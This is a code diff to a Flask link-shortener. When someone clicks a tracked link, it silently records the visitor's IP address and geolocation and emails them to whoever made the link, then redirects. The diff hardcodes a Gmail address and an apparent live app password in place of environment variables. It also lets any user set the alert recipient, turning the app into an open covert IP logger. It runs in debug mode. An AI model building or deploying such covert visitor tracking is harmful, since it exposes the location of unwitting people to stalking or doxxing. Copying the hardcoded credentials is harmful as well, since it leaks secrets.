@@ -4,11 +4,9 @@ from email.message import EmailMessage
 
 app = Flask(__name__)
 
-
-EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
-EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
-TO_EMAIL = os.getenv("TO_EMAIL")
 DB_FILE = "url_db.json"
+EMAIL_ADDRESS = "yaswanthyaswsnth@gmail.com"
+EMAIL_PASSWORD = "izpgmmarafnznuoe"
 
 
 def load_db():
@@ -32,11 +30,11 @@ def get_geolocation(ip):
         return {}
 
 
-def send_email_alert(ip_data, short_code):
+def send_email_alert(ip_data, short_code, recipient_email):
     msg = EmailMessage()
     msg['Subject'] = f"[Visitor] Tracked /track/{short_code}"
     msg['From'] = EMAIL_ADDRESS
-    msg['To'] = TO_EMAIL
+    msg['To'] = recipient_email
 
     msg.set_content(f"""
 New Visitor Alert
@@ -64,12 +62,14 @@ Coordinates: {ip_data.get('lat', 'N/A')} / {ip_data.get('lon', 'N/A')}
 def index():
     if request.method == 'POST':
         url = request.form.get("url")
+        recipient_email = request.form.get("recipient_email")
+
         if not url.startswith("http"):
             url = "http://" + url
 
         short_code = uuid.uuid4().hex[:6]
         db = load_db()
-        db[short_code] = url
+        db[short_code] = {"url": url, "email": recipient_email}
         save_db(db)
 
         short_url = request.host_url + "track/" + short_code
@@ -81,14 +81,20 @@ def index():
 @app.route('/track/<code>')
 def track(code):
     db = load_db()
-    real_url = db.get(code)
-    if not real_url:
+    entry = db.get(code)
+
+    if not entry:
         return "Invalid or expired link.", 404
+
+    real_url = entry["url"]
+    recipient_email = entry["email"]
 
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     geo_data = get_geolocation(ip)
-    send_email_alert(geo_data, code)
+    send_email_alert(geo_data, code, recipient_email)
+
     return redirect(real_url)
+
 
 if __name__ == "__main__":
     app.run(debug=True)
